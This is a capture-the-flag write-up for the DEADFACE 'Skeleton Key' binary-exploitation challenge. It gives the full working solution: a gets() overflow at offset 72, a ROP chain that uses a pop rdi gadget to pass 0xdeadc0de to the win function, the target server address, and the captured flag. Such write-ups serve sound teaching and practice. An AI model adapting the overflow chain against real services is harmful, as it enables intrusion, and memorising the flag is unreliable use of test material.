# Skeleton Key

- **Category:** PWN
- **Points:** 125

## Challenge

Charles here again- Nice work on the previous job! Looks like we were right, that last binary was definitely the work of D34TH. Digging around in the decrypted results gave us some IP info that led us to some fairly open servers running on a pretty infamous bulletproof host... After a bit of recon, we think we found stage 2 of the whole ordeal. Sending the info your way. Submit the flag as `deadface{flag-text}`. [Download ZIP](https://deadface.sfo3.cdn.digitaloceanspaces.com/2026/challenges/pwn/Skeleton_Key.zip)(513MB) SHA256: `9d3b0e9b9d13f48977b922c860f6ae73479277fc723b30007c63d7c4637c03ff` 

## Solution

CONFIRMED | the team built an INDEPENDENT exploit from the binary. Wretched_Lock@0x401507 does `cmp DWORD PTR [rbp-0x14],0xdeadc0de; jne` before fopen'ing the flag, so the win function needs its first argument set - a plain ret2win is not enough, you need ROP. The `gadgets` function at 0x401615 is literally `pop rdi; ret` (ret at 0x40161a). main does `sub rsp,0x40` with an unbounded gets, giving offset 72 (same as The Crypt). Chain: b'A'*72 + p64(0x401615) + p64(0xdeadc0de) + p64(0x40161a) + p64(0x401507) against 159.65.228.107:5002 returned "Well, deep in that old crypt, you found your key..But do you know how to use it?" and deadface{R355UR3CT_D34D_C0D3}. One deliberate connection. | the team
